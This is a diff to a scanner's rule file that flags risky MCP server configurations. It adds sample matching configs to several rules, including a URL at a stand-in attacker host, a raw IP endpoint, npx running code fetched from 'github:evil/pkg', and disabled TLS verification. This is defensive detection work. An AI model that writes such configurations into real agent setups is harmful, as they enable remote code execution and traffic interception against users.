@@ -14,6 +14,9 @@ rules:
     detail: "A registered MCP server connects to a remote URL. Verify this is an approved server and not an attacker-controlled redirect."
     taxonomy_id: MCP-T14
     atlas_id: J4
+    examples:
+      match:
+        - "{\"servers\": {\"x\": {\"url\": \"https://evil.example.com/mcp\"}}}"
 
   - id: mcp_server_raw_ip
     pattern: "(?i)\"(url|endpoint|baseUrl|uri)\"\\s*:\\s*\"https?://(?!127\\.|0\\.0\\.0\\.0)\\d{1,3}(\\.\\d{1,3}){3}([:/]|\")"
@@ -22,6 +25,9 @@ rules:
     detail: "A raw IP in an MCP server definition bypasses DNS verification and is a strong indicator of a shadow server or test-left-in-production."
     taxonomy_id: MCP-T14
     atlas_id: J4
+    examples:
+      match:
+        - "{\"servers\": {\"x\": {\"url\": \"https://8.8.8.8:9090/mcp\"}}}"
 
   - id: mcp_server_env_credential_injection
     pattern: "(?i)\"env\"\\s*:\\s*\\{[^}]*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|AUTH)[^}]*\\}"
@@ -46,6 +52,9 @@ rules:
     detail: "The server definition runs code fetched from a git host or URL at agent startup, bypassing the registry. An attacker who controls this config or that source achieves code execution."
     taxonomy_id: MCP-T08
     atlas_id: J6
+    examples:
+      match:
+        - "{\"servers\": {\"x\": {\"command\": \"npx\", \"args\": [\"github:evil/pkg\"]}}}"
 
   - id: mcp_server_disabled_tls_verify
     pattern: "(?i)\"(tls|ssl|verify|NODE_TLS_REJECT_UNAUTHORIZED)\"\\s*:\\s*\"?(false|0)\"?"
@@ -54,6 +63,9 @@ rules:
     detail: "TLS verification is disabled, allowing MITM interception of all traffic between the agent and this MCP server."
     taxonomy_id: MCP-T06
     atlas_id: J4
+    examples:
+      match:
+        - "{\"servers\": {\"x\": {\"verify\": false}}}"
 
   - id: mcp_server_wildcard_tool_allowlist
     pattern: "(?i)\"(allowedTools|tools|enabledTools)\"\\s*:\\s*\\[\\s*\"\\*\""
